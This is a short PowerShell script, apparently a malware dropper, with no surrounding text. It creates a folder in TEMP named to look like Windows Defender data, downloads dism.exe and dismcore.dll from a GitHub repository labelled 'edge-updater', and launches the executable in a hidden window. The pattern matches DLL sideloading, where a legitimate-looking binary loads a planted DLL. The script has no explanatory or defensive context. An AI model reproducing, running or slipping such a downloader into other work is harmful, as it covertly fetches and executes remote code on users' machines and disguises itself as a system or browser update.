$d=$env:TEMP+'\WinDefData'
if(!(Test-Path $d)){New-Item $d -Force|Out-Null}
$u='https://raw.githubusercontent.com/emuladortrampo-lgtm/edge-updater/main/'
(New-Object Net.WebClient).DownloadFile($u+'dismcore.dll',$d+'\dismcore.dll')
(New-Object Net.WebClient).DownloadFile($u+'dism.exe',$d+'\dism.exe')
Start-Process $d+'\dism.exe' -WindowStyle Hidden
